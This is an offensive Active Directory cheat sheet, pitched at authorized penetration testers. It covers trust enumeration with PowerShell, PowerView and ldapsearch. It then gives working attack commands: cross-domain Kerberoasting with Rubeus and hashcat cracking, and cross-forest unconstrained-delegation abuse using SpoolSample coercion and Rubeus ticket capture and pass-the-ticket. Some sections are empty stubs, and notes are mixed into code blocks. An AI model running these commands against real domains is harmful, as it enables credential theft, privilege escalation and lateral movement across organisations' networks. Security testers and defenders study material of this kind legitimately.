# Enumeration
```powershell
// Trust Direction

// Trust Type

// Trust Attributes
NON_TRANSITIVE       0x00000004 (4)      Forest Wide
UPLEVEL_ONLY         0x00000008 (8)      Only Kerberos
FILTER_SIDS          0x00000040 (64)     SID History Injection
TREAT_AS_EXTERNAL    0x00000400 (1024)   Hard SID Filtering
```

# Active Directory Trust Enumeration — Cheat Sheet

A comprehensive reference for enumerating, mapping, and understanding Active Directory (AD) trust relationships, for use in authorized penetration testing, red team engagements, and AD security assessments.

### 1. PowerShell Active Directory Module (`RSAT-AD-PowerShell`)
```powershell
# Import module
Import-Module ActiveDirectory

# List all trusts for current domain
Get-ADTrust -Filter *

# List trusts with full properties
Get-ADTrust -Filter * -Properties *

# Specific domain
Get-ADTrust -Identity "target.local"

# Forest-level trust info
Get-ADForest | Select-Object -ExpandProperty Domains
(Get-ADForest).UpperBound
Get-ADForest -Identity target.local | fl *

# Domain info
Get-ADDomain
Get-ADDomain -Identity child.target.local

# Trust direction translation:
# 0 = Disabled, 1 = Inbound, 2 = Outbound, 3 = Bidirectional
```

## 2. PowerView (PowerSploit / Dev-Branch)

PowerView remains one of the most thorough offline AD recon tools for trust mapping.

```powershell
# Import
Import-Module .\PowerView.ps1
# or
. .\PowerView.ps1

# Domain trust enumeration (current domain)
Get-DomainTrust

# Trusts for a specific domain
Get-DomainTrust -Domain target.local

# Map ALL trusts recursively across the environment (key command)
Get-DomainTrustMapping

# Forest trusts
Get-ForestTrust
Get-ForestTrust -Forest target.local

# Forest domains
Get-ForestDomain
Get-ForestDomain -Forest target.local

# Foreign users / groups (objects with cross-domain membership — indicates active trust abuse paths)
Get-DomainForeignUser
Get-DomainForeignGroupMember

# Find users in current domain who are members of groups in other domains
Get-DomainGroupMember -Domain target.local -Identity "Domain Admins"

# Find GPOs that might apply across domains
Get-DomainGPO -Domain target.local
```

### 3. `ldapsearch`
```bash
# Anonymous / authenticated bind to enumerate trustedDomain objects
ldapsearch -x -H ldap://<DC_IP> -D "user@target.local" -w 'Password1' \
  -b "CN=System,DC=target,DC=local" "(objectClass=trustedDomain)" \
  trustPartner trustDirection trustType trustAttributes securityIdentifier

# Full forest-wide search using Global Catalog (port 3268)
ldapsearch -x -H ldap://<DC_IP>:3268 -D "user@target.local" -w 'Password1' \
  -b "DC=target,DC=local" "(objectClass=trustedDomain)"
```

# Cross Domain Kerberoasting
```powershell
We are in the OXSIUM.LOCAL and have Bidirectional Trust
.\Rubeus.exe kerberoast /domain:warzone.oxsium.local /dc:192.168.0.199 /outfile:C:\Tools\hashes.txt

hashcat -m 13100 kerb_hashes.txt wordlist.txt
```

# Cross Forest Unconstrained Delegation
```powershell
Get-ADTrust -Identity warzone.oxsium.local -Properties TrustAttributes | Select TrustAttributes

NEED Privilege Users
# UNCON-PC is now configured with unconstrained delegation on warzone.oxsium.local
.\Rubeus.exe monitor /interval:5 

# Coerce the parent domain’s DC to its own unconstrained host
.\SpoolSample.exe WIN-MAIN-SERVER.oxsium.local UNCON-PC.warzone.oxsium.local
OR
dir \\UNCON-PC.warzone.oxsium.local\c$

.\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
```

# Configuration Naming Context Attacks
```powershell

```
